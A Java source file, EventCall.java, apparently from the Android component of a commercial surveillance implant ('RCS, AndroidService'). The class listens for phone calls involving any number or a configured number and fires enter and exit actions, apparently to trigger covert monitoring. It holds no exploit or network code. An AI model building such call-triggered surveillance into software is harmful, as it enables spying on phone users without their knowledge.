/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.Call;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

public class EventCall extends BaseEvent implements Observer<Call> {
	/** The Constant TAG. */
	private static final String TAG = "EventCall"; //$NON-NLS-1$

	private int actionOnExit, actionOnEnter;
	private String number;
	private boolean inCall = false;

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			number = conf.getString("number");

			if (Cfg.DEBUG) {
				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
			}
		} catch (final ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		// TODO Auto-generated method stub
	}

	public int notification(Call c) {
		// Nel range
		if (c.isOngoing() && inCall == false) {
			// Match any number
			if (number.length() == 0) {
				inCall = true;
				onEnter();
				return 0;
			}

			// Match a specific number
			if (c.getNumber().contains(number)) {
				inCall = true;
				onEnter();
				return 0;
			}

			return 0;
		}

		if (c.isOngoing() == false && inCall == true) {
			inCall = false;

			onExit();
			return 0;
		}

		return 0;
	}


}
